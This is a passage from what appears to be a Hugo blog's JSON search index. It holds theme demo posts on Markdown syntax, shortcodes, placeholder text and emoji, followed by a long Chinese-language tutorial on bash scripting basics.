Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"","id":126,"section":"en","tags":["markdown","css","html","themes"],"title":"Markdown Syntax Guide","uri":"http://crkmythical.github.io/en/blog/markdown-syntax/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":127,"section":"en","tags":["markdown","css","html","themes"],"title":"Section","uri":"http://crkmythical.github.io/en/devsecops/contentmanagement/sections/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nHugo ships with several Built-in Shortcodes for rich content, along with a Privacy Config and a set of Simple Shortcodes that enable static and no-JS versions of various social media embeds.\n YouTube Privacy Enhanced Shortcode   Twitter Simple Shortcode .twitter-tweet { font: 14px/1.45 -apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif; border-left: 4px solid #2b7bb9; padding-left: 1.5em; color: #555; } .twitter-tweet a { color: #2b7bb9; text-decoration: none; } blockquote.twitter-tweet a:hover, blockquote.twitter-tweet a:focus { text-decoration: underline; }  “In addition to being more logical, asymmetry has the advantage that its complete appearance is far more optically effective than symmetry.”\n— Jan Tschichold pic.twitter.com/gcv7SrhvJb\n\u0026mdash; Graphic Design History (@DesignReviewed) January 17, 2019 Vimeo Simple Shortcode  .__h_video { position: relative; padding-bottom: 56.23%; height: 0; overflow: hidden; width: 100%; background: #000; } .__h_video img { width: 100%; height: auto; color: #000; } .__h_video .play { height: 72px; width: 72px; left: 50%; top: 50%; margin-left: -36px; margin-top: -36px; position: absolute; cursor: pointer; }  ","description":"","id":128,"section":"en","tags":["shortcodes","privacy"],"title":"Rich Content","uri":"http://crkmythical.github.io/en/blog/rich-content/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\ninhospita parcite confusaque translucet patri vestro qui optatis\nlumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\n Exierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude  Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus\nsilentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria\ntractus malis.\n Comas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et  Vagus elidunt \nThe Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra\ndicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere\nfurit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli\nLelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare\nEchionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert\nausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae\nvulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem\nPropoetides parte.\n","description":"","id":129,"section":"en","tags":["markdown","text"],"title":"Placeholder Text","uri":"http://crkmythical.github.io/en/blog/placeholder-text/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nEmoji can be enabled in a Hugo project in a number of ways.\n The emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site’s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 🙈 🙉 🙉 🙊 🙊\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3  .emoji { font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols; }  ","description":"","id":130,"section":"en","tags":["emoji"],"title":"Emoji Support","uri":"http://crkmythical.github.io/en/blog/emoji-support/"},{"content":"编写进度\n   编程基本元素 I/O 1 2 3 4 5 6  VAR=\u0026#34;string\u0026#34; # 声明变量之间不能带有空格 read MYVAR # input CMDOUT=$(pwd) # 将pwd命令的输出保存到CMDOUT中 echo \u0026#34;$MYVAR\u0026#34; # output printf \u0026#34;$VAR\u0026#34; # output   输入read命令  a 后跟一个变量，该变量会被认为是个数组，然后给其赋值，默认是以空格为分割符。 d 后面跟一个标志符，其实只有其后的第一个字符有用，作为结束的标志。 p 后面跟提示信息，即在输入前打印提示信息。 e 在输入的时候可以使用命令补全功能。 n 后跟一个数字，定义输入文本的长度，很实用。 r 屏蔽\\，如果没有该选项，则\\作为一个转义字符，有的话 \\就是个正常的字符了。 s 安静模式，在输入字符时不再屏幕上显示，例如login时输入密码。 t 后面跟秒数，定义输入字符的等待时间。 u 后面跟fd，从文件描述符中读入，该文件描述符可以是exec新开启的。 )  输出 echo命令 echo显示颜色\n1 2 3 4 5 6  echo [-ne E] [String] -E : (默认)转义,不解释参数中的转义符 -e : 不转义,解释参数中的转义符 -n : 打印内容不换行    String 中的转义符(由echo命令解释)  \\a : 告警 \\b : 退格 \\c : 忽略输出中最后的换行符 \\f : 换页 \\n : 回车换行(Newline) \\r : 回车 \\t : 水平制表符 \\v : 垂直制表符 \\\\ : 反斜线    printf 1  printf \u0026#34;\u0026lt;foramtString\u0026gt;\u0026#34; arg1 arg2 ...     formatString : 待输出的字符串\n  格式规范 %[flags][width][.precision]\u0026lt;type\u0026gt;\n flags : + - # \u0026lt;space\u0026gt;   + : 在整数前加+/- - : 使用width时,表示输出数值左对齐 # : 输出(八进制标识符)0 和(十六进制标识符)0x或0X \u0026lt;space\u0026gt; : 空格,起对齐作用在打印正数前面加上一个空格,打印负数前面加上-。   width 指定输出参数时最小字段宽度, 对应的参数默认采用右对齐的形式\n  .precision : 表示整数的最小位数,字符串的最大字符数,*代表使用下一个参数作为精度\n  type\n    %d : 整数\n  %u : 无符号整数\n  %o : 八进制整数\n  %x : 十六进制整数(a-f)\n  %X : 十六进制整数(A~F)\n  %c : 单个字符\n  %s : 字符串字面量\n  %b : 包含转义字符的字符串\n  %% : 百分号\n    多行输出  不转义输出  1 2 3 4 5  cat \u0026lt;\u0026lt;EOF # date命令会执行 Line1 `date` Line3 EOF    转义输出  1 2 3 4 5  cat \u0026lt;\u0026lt;\\EOF # date命令原样输出 Line1 `date` Line3 EOF   变量 变量名(字母、数字、下划线)由[a-z]、[A-Z]、_、[0-9]组合，且开头不能是[0-9]\n 变量本质上是存储数据的一个或多个计算机内存地址\n 变量操作 1 2 3 4 5 6 7  var=value # 等号两边不能有空格  var=`command argument` # 变量名 var=1 # 设置变量 unset var # 清除变量 var=2 readonly var #设置var为只读变量   变量间接引用eval eval 使shell对args求值, 然后执行求职结果。常用于从变量中构造命令行\n变量适用条件：\n 含有命令终止符: ;、|、\u0026amp; 含有I/O重定向: \u0026lt;、\u0026gt; 引号: '、\u0026quot;  1 2 3  x=\u0026#34;askding\u0026#34; askding_url=\u0026#34;askding.github.io\u0026#34; eval echo \\$${x}_url   间接参数扩展 ${!var} 1 2 3 4 5 6  parameter=\u0026#34;var\u0026#34; var=\u0026#34;hello\u0026#34; echo ${!parameter} hello   shell参数扩展- 空参数处理 ${var1:-var2} 等价于 (!isSet(va1) || var1 == NULL)\n即 判断var1为unset或者var1为NULL\n参数扩展：取得var代表的变量的值\n ${var-word} : var存在(可为空),就是var,不存在就是word ${var=word} : var存在(可为空),就是var,不存在就是word, var也是word。 ${var+word} : var存在(可为空),就是var,不存在就是空 ${var?word} : var存在(可为空),就是var, 不存在将word写入到标准错误并退出   :表示var非空\n   ${var:-word} : var存在非空就是var，不存在就是word\n 若var存在且非空,则${}=$var 若var未定义或为空值, ${}=word，$var不变    ${var:=word} : var存在非空就是var，不存在就是word，var也是word\n 若var存在且非空, ${}=$var 若var未定义或为空值,${}=word, 且$var=word    ${var:+word} : var存在非空就是var，不存在就是空\n 若var存在且非空, ${}=word 若var未定义或为空值, ${}为空，$var不变    ${var:?word} : var存在就非空是var，不存在打印word并终止\n 若var存在且非空, ${}=$var 若var未定义或为空值, 输出word,并终止脚本     :表示var非空\n未定义 表示未执行var=xxx 或set var=xxx\n为NULL 表示 set var\n  指定默认值   ${VAR:=WORD} 当VAR未定义(set) 给VAR赋默认值WORD, 结果也为WORD ${VAR=WORD} 当VAR未定义(set)或为空，给VAR赋默认值WORD, 结果也为WORD  使用默认值   ${VAR:-WORD} 当VAR未定义(set),或为NULL，结果为WORD ${VAR-WORD} 当VAR未定义(set) ， 则结果为WORD  使用替代值   ${VAR:+WORD} 当VAR未定义,或为空, 则结果为空; ${VAR+WORD} 当VAR未定义,或为空, 则结果为空;\n当VAR被set且赋不为空值时，则会使用WORD  字符串操作   ${#var} : 返回${var}变量的长度\n  ${var:m} : 返回${var}中第m个字符开始到结尾部分(从0开始计算)\n  ${varⓜ️len} : 返回${var}中第m个字符开始，长度位len的部分\n  ${var#pattern} : 删除${var}中开头部分与pattern匹配的部分(非贪婪模式)\n  ${var##pattern} : 删除${var}中开头部分与pattern匹配的部分(贪婪模式)\n  ${var%pattern} : 删除${var}中结尾部分与pattern匹配的部分(非贪婪模式)\n  ${var%%pattern} : 删除${var}中结尾部分与pattern匹配的部分(贪婪模式)\n  ${var/old/new} : 用new替换${var}中第一次出现的old\n  ${var//old/new} : 用new替换${var}中所有old(全局替换)\n  ${var/#old/new} : 用new替换${var}中开头部分与old匹配的部分\n  ${var/%old/new} : 用new替换${var}中结尾部分与old匹配的部分\n  数组操作  整数索引的数字 Arrary[index] 可直接使用变量名创建 关联(字符串)数组 Colors[\u0026quot;red\u0026quot;]=\u0026quot;#FF0000\u0026quot; 必须使用declare -A声明创建  创建数组 1 2 3 4 5 6  ARRAY[index]=value # index为算数表达式,或(0,1,2,...)的整数 ARRAY=(Value1 Value2 Value3 [5]=Vlaue5 ...) # 第三、四元素为空字符串\u0026#34;\u0026#34; declare -a Array_name # 声明Array_name是一个数组 read -a Array_name # 将用户的命令行输入,当成Array_name的数组元素,以空格符分隔符   读取数组 1 2 3  echo ${array[index]} # 打印单个数组成员 echo ${array[@]} ${array[*]} # 打印所有成员,推荐使用`\u0026#34;${array[@]}\u0026#34;` array_copy=( \u0026#34;${array[@]}\u0026#34; ) # 拷贝数组   数组长度 1 2 3  echo ${#array[@]} ${#array[*]} # 打印数组长度 echo ${#array} #打印第一个成员的长度 echo ${#array[i]} # 打印指定成员长度    打印数组序号 1  echo ${!array[@]} ${!array[*]}   打印数组成员(数组切片) 1 2 3  echo ${array[@]:position:lens} ${array[*]:position:lens} # position从0开始 # lens为长度，不指定，返回从position开始的所有成员   追加数组成员 1 2 3  array=(a b c) array+=(d e f) # 利用+=可以追加数组元素 echo ${array[@]}   删除数组及成员 1 2  unset array # 清空整个数组 array[i]=\u0026#39;\u0026#39; #隐藏第i+i个元素,设为空值=\u0026#39;\u0026#39;   shell内部变量  # : 位置参数的个数 ? : 上条命令执行后的返回值 $ : 当前shell进程的PID ! : 最后一个后台运行命令的PID 0 : 当前执行的shell程序的名称 @ : 位置参数的内容 * : 位置参数的内容,受IFS影响 _ : shell启动时,为正在运行shell程序的绝对路径。shell结束后为上一条命令的最后一个参数  内部特殊参数 每个参数由空格符分隔，并在bash中使用一组特殊的标识符$[num]进行访问。\n $0 : 表示命令行输入的脚本名称 $1 : 第一个参数 $n : 第n个参数 $# : 参数的个数,不包括$0 $@ : 用空格分隔的所有参数$1 $2 $3 \u0026hellip; $n $* : 根据$IFS分隔所有参数  注：$* 和 $@ 的区别\n$* 和 $@ 都表示传递给函数或脚本的所有参数，不被双引号(\u0026quot; \u0026ldquo;)包含时，都以\u0026rdquo;$1\u0026quot; \u0026ldquo;n\u0026rdquo; 的形式输出所有参数。\n但是当它们被双引号(\u0026quot; \u0026ldquo;)包含时\n \u0026quot;$*\u0026quot; 会将所有的参数作为一个整体，以\u0026rdquo;$1 n\u0026quot;的形式输出所有参数； \u0026quot;$@\u0026quot; 会将各个参数分开，以\u0026quot;$1\u0026quot; \u0026ldquo;n\u0026rdquo; 的形式输出所有参数。  进程状态的相关参数\n $$: 输出当前进程的进程号 $! : 输出后台运行的最后一个PID $_: 输出上一条命令的最后一个参数  exit  # 设置返回状态码\n $? : 输出上条命令执行后的返回值  0 : 成功 1-255 : 不成功  1 : 通用错误/执行失败 126 : 命令或脚本没执行权限 127 : 命令没找到      1 2 3 4 5 6 7 8 9 10  # 练习脚本 echo \u0026#34;Hello,$USER, the output of this script are as follows:\u0026#34; echo -e \u0026#34;The script name is : \\t $(basename $0)\u0026#34; echo -e \u0026#34;The first param of the script is: \\t $1\u0026#34; echo -e \u0026#34;The second param of the script is: \\t $2\u0026#34; echo -e \u0026#34;The five param of the script is: \\t $5\u0026#34; echo -e \u0026#34;All the params you input are: \\t $@\u0026#34; echo -e \u0026#34;The PID of this script is: \\t $$\u0026#34; echo -e \u0026#34;The exit status of this script is: \\t $?\u0026#34;   操作符 整数运算符 $[] 和 $((expression)) :+ - * / % **(幂)\n整数比较操作符号  []和[[]]的操作符号   [ int1 -eq int2 ] : = ((int1 == int2)) [ int1 -ne int2 ] : != ((int1 != int2)) [ int1 -gt int2 ] : \u0026gt; ((int1 \u0026gt; int2)) [ int1 -ge int2] : \u0026gt;= ((int1 \u0026gt;= int2)) [ int1 -lt int2 ] : \u0026lt; ((int1 \u0026lt; int2)) [ int1 -le int2 ] : \u0026lt;= ((int1 \u0026lt;= int2))  ⚠️：\n== != \u0026lt; \u0026gt; 等操作符号在[] [[]]中使用需要转义,macOS中不可用此种方式\n1  a=2;b=6; [ $a \\\u0026gt; $b ]; echo $?   字符串测试操作符号 1  str=Tom ;[ -z \u0026#34;$str\u0026#34; ]; echo $?     [ str ] : $str不为空,返回真\n  [ -z str ] : $str长度为0,返回真\n  [ -n str ] : $str长度不为0,返回真\n  [ str1 = str2 ] : 测试str1与str2相等,返回真\n  [ str1 != str2 ] : 测试str1与str2不想等,返回真\n  [[ str1 == str2 ]] : 测试str1与str2相同,返回真\n  [[ str1 != str2 ]] : 测试str1与str2不相同,返回真\n  [[ str1 =~ str2 ]] : str2是str1的子串,返回真\n  [[ str1 \u0026gt; str2 ]] : str1 大于str2,返回真\n  [[ str1 \u0026lt; str2 ]] : str1小于str2,返回真\n  逻辑运算符 三元表达式:  [ ] \u0026amp;\u0026amp; echo T || echo F\n 常用方式:   [[ pattern1 \u0026amp;\u0026amp; pattern2 ]] : 逻辑与 [[ pattern1 || pattern2 ]] : 逻辑或 [[ !pattern ]] : 逻辑非  不常用方式:   [ expr1 -a expr2 ] : and [ expr1 -o expr2 ] : or [ !expr ] : 非！  1  x=1;name=Tom; [ $x -eq 1 -a -n $name ]; echo $?   文件测试操作符号   [ -b fname ] : fname为块设备,返回真\n  [ -c fname ] : fname为字符设备,返回真\n  [ -p fname ] : fname为命名管道,返回真\n  [ -S fname ] : fname为Socket,返回真\n  [ -s fname ] : fname存在且size\u0026gt;0,返回真\n  [ -f fname ] : fname存在且是普通文件,返回真\n  [ -L fname ] : fname存在且是链接文件,返回真\n  [ -e fname ] : fname(文件或目录)存在,返回真\n  [ -d fname ] : fname存在且是目录,返回真\n  [ -r fname ] : fname(文件或目录)存在且可读,返回真\n  [ -w fname ] : fname(文件或目录)存在且可写,返回真\n  [ -x fname ] : fname(文件或目录)存在且可执行,返回真\n  流程控制语句 顺序语句 程序会顺序来执行代码，从上往下一行一行执行\n分支语句 条件测试语句格式：\n [  ] 等效于test \n[[  ]]\n 区别：\n [] 不支持逻辑运算符、正则表达式 [[]] 支持逻辑运算符\u0026amp;\u0026amp;、||、!、和()，支持正则表达式匹配  if型  if语句可嵌套使用 必须以if开头，fi结尾 elif 可以有0个或多个 else最多只能有个一个 commands为可执行语句块,shell提供空命令: ; 相当于命令换行  1 2 3 4 5 6 7 8 9 10 11 12 13 14  if [ expr1 ]; then \u0026lt;commands1\u0026gt; #expr1为真时，执行commands1 elif [ expr2 ]; then \u0026lt;commands2\u0026gt; # expr1为假，expr2为真时，执行commands2 elif [ expr3 ]; then \u0026lt;commands3\u0026gt; # expr1到expr2为假，expr3为真时，执行commands3 ... elif [ exprn ]; then \u0026lt;commandsn\u0026gt; # expr1到expr(n-1)为假，exprn为真时，执行commandsn else \u0026lt;command\u0026gt; # 当expr(1-n)都为假时，执行command  fi   case型 1 2 3 4 5 6 7 8 9 10 11  case $expr in pattern1) # 若expr与pattern1匹配, commands1 # 执行语句块commands ;; # 跳出case结构 pattern2) commands2 ;; *) # 若expr与上面的pattern均不匹配 commands ;; esac # case语句必须以easc终止   select型  while+case语句可实现select\n 1 2 3  select answer in \u0026lt;list\u0026gt;; do commands # 循环变量answer每取一次值，循环体commands就执行一遍 done # 循环结束标志   循环语句  break 强行退出本层循环。 break [n] 退出第几层循环(最里面为第一层循环) continue 忽略本次循环的剩余部分，回到循环的顶部,继续下一次循环。 continue [n] 回到第n次循环的顶部  for循环  python格式  1 2 3  for item in list ; do commands done    C语言格式(不常用)  1 2 3 4  for ((i=0;i\u0026lt;100;i++)) do echo $i done   while循环  与until作用相反\n 1 2 3  while expr ; do # 执行expr表达式是否为真 commands # 循环体语句 done [\u0026lt; test.file] # 循环结束标志,返回循环顶部   until循环  与while作用相反\n 1 2 3 4  until expr ; do # 执行expr表达式是否为假, expr为真退出循环 commands # expr退出状态为假, 执行循环体commands done # 循环体结束标志, 返回循环顶部   函数 关键字function和重定向命令可选\n1 2 3 4 5 6 7 8 9 10 11  [function] myfun(){ commands # body of the funtion goes here [break] # 退出当前函数 [exit \u0026lt;n\u0026gt;] # 退出整个脚本 [return \u0026lt;n\u0026gt;] # 退出当前函数。未指定n，则返回函数最后一条milling执行后所返回的状态  } [重定向] myfun [arg1 arg2 ... argn] # 运行函数,arg参数通过位置参数$n传入 echo $? # 查看函数myfun返回值   ⚠️\n 作用域: 函数内的变量的作用域默认是全局的，可使用local限定作用域于函数内 函数定义中不必声明参数个数，参数个数由此函数被调用时给定。  调试 打印变量 1 2 3 4 5 6 7 8  #! /bin/bash echo $var ; exit # 单独调试某个变量  trap \u0026#34;echo a=$ab=$b\u0026#34; EXIT # 程序退出打印程序内的变量  a=20 b=30 exit   sh命令参数 1 2 3 4  bash [-n | -v | -x] \u0026lt;file.sh\u0026gt; -n : 仅模糊检查语法错误,不执行file.sh脚本。 -x : 打印每条命令的结果   Tips  help 查看shell内置命令  1 2 3  ssh myserver ps \u0026gt; /tmp/ps.out #重定向到本地/tmp目录 ssh myserver ps \\\u0026gt; /tmp/ps.out #重定向到服务器/tmp目录     . aa.sh : 在当前shell环境下执行aa.sh内的命令  子shell运行  export \u0026lt;variables\u0026gt;[=value] : 导出指定变量到子shell中  1  var1=value1 var2=value2 ... varn=valuen command   将var[1-n]及其值放入到command环境中,执行command。当前shell不存在变量var[1-n]\n异步执行 wait [PID] wait [PID] # 不写PID, 则shell会等待所有的子进程执行完毕。在子进程执行完毕前,当前shell会被挂起。 命令组  (commands ...) : 在子shell中运行 { command;..;} : 在当前shell中运行, 开头有空格,命令后带;  转义符\\ 转义就是转成字符字面含义\n\\x : 使用x字符的字面意义。\n引号'' \u0026quot;\u0026quot;  '' 单引号不能嵌套,引号内的所有字符转义,即保持字面含义。 \u0026quot;\u0026quot; 双引号内的字符,含有转义符\\ 后跟$、`、\u0026quot; 、\\保持特殊含义，不转义。  参数左移shift [n]  shell命令将shell程序的参数$1 \u0026hellip;$n分别向左移动n位。\n单字符参数处理getopts 1  getopts \u0026lt;optstring\u0026gt; \u0026lt;opt\u0026gt; [arg...]    optstring : 代表参数字符串, 开头含有:,表示不打印错误信息  eg: aa.sh -a -b -p value optstring就是abp: , -a -b为开关型选项 当getopts匹配到-p参数时, value会被存放在shell内置变量OPTARG中   opt : getopts存放参数名的变量, 参数对应的值存在OPTARG  每次执行getopts,会从命令行中获取下一个参数，存放在name中 如果获取的参数不在optstring中, name的值为?   arg : 默认是$@, 即shell脚本的全部参数 OPTIND : 存放所有参数的下标, 开关型参数下标=1 含参型下标=2  多字符参数处理getopt shell环境变量  HOME : 存放用户主目录的完整路径名 PATH : shell执行命令时顺序搜索可执行文件 TERM : 终端类型 UID : 当前用户标识 PS1 : 主提示符 PS2 : 辅助提示符 PS4 : set -x 模式下的提示符,默认+ IFS : 输入域分隔符  重定向    形式 含义     \u0026lt; file 标准输入重定向到file,将file内容输入到终端里   \u0026gt; file 标准输出重定向到file   command \u0026lt; file1 \u0026gt;file2 将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。     重定向标准输出及标准错误  1  `commands`\u0026gt;file 2\u0026gt;\u0026amp;1 等效于 \u0026amp;\u0026gt;file 等效于 \u0026gt;\u0026amp;file   按照重定向符号的顺序自左至右执行，\n首先标准输出重定向至file中，\n2\u0026gt;\u0026amp;1 表示将标准错误重定向至标准输出\n 追加重定向标准输出及标准错误  1  `command` \u0026gt;\u0026gt; file 2\u0026gt;\u0026amp;1 等效于 \u0026amp;\u0026gt;\u0026gt; file   命令替换 将命令的输出作为命令替换位置的文本\nvar=ps -ef |wc -l\nvar=$(ps -ef | wc -l)\n ${} :用于定义变量 $() : 用于命令替换,等效于` ` $[ ]  和$(()): 用于整数运算  脚本执行结束清理缓存文件 1 2 3 4 5 6 7 8 9 10 11 12  #!/bin/bash  # trap捕捉到EXIT信号时执行rm -f \u0026#34;$TMPFILE\u0026#34; 命令 # 最好放在shell脚本的开头 # trap \u0026lt;command | function \u0026gt; \u0026lt;SIGNAL\u0026gt; SINGAL2 ...SINGALN trap \u0026#39;rm -f \u0026#34;$TMPFILE\u0026#34;\u0026#39; EXIT TMPFILE=$(mktemp) || exit 1 ls /etc \u0026gt; $TMPFILE if grep -qi \u0026#34;kernel\u0026#34; $TMPFILE; then echo \u0026#39;find\u0026#39; fi   根据扩展名切分文件名 文件名格式:name.extention\n % : 提取文件名name部分 # : 提取文件名extention部分  1 2 3 4  file=\u0026#34;sample.jpg\u0026#34; echo \u0026#34;文件名: ${file%.*}\u0026#34; # 从file中删除位于%右侧通配符(.*)匹配到的字符,匹配方向从右向左匹配,非贪婪模式,贪婪模式加%% echo \u0026#34;扩展名: ${file#*.}\u0026#34; # 从file中删除位于#右侧通配符(*.)匹配到的字符串,匹配方向从左到右匹配,非贪婪模式,贪婪模式加##   shell命令行使用vi行编辑模式 修改命令时，不管处于哪种模式，按下Enter就会解释当前命令。\n1  set -o vi/emacs   set命令切分字段 1 2 3 4 5 6  aa=\u0026#34;aa bb cc\u0026#34; # set $aa会将aa的值根据IFS来切分赋给位置参数 set $aa echo $1 echo $2 echo $3   GUI界面Dialog 终端颜色 tput显示颜色  tput setab \u0026lt;num\u0026gt; : 设置背景色 tput setaf \u0026lt;num\u0026gt; : 设置前景色                \u0026lt;num\u0026gt; 0 